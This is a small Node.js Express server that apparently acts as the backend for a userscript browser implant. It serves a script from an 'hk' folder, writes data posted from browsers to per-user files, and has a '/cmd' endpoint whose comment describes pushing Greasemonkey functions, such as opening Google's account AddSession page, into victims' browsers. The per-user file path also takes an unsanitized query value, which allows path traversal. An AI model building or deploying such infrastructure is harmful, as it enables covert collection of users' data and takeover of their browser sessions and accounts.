import express from "express";
import {
  text as textParser
  //  json as jsonParser,
  //  urlencoded as urlParser
} from "body-parser";
import { readFileSync, writeFile } from "fs";

const dev = process.env.NODE_ENV === "development";
const app = express();

app.use(textParser());
//app.use(jsonParser());
//app.use(urlParser({ extended: true }));

app.get("/", (req, res) => {
  let user = req.query.user,
    hash = req.query.hash;
  let content = readFileSync("./hk/index.js");
  console.log({ content });
  res.send(content.toString());
});

app.post("/action", (req, res) => {
  writeFile(`data/${req.query.user}.txt`, `${req.body}\r\n==\r\n`, error => {
    if (error) res.json({ ok: false, error });
    else res.json({ ok: true });
  });
});

app.get("/cmd", (req, res) => {
  /*
   use `GM` constant to access GM scope. (ex: let info = GM.getInfo();)
  ex:
  google_8720: function() {
    GM.GM_openInTab("https://accounts.google.com/AddSession")
  }
  */
  let user = req.query.user,
    hash = req.query.hash;
  res.json({});
});

let PORT = process.env.PORT || 4200;
app
  .listen(PORT, () => {
    console.log(`Node Express server listening on port:${PORT}`);
  })
  .on("error", error =>
    console.error("[server] express error:", { port: PORT, error })
  );
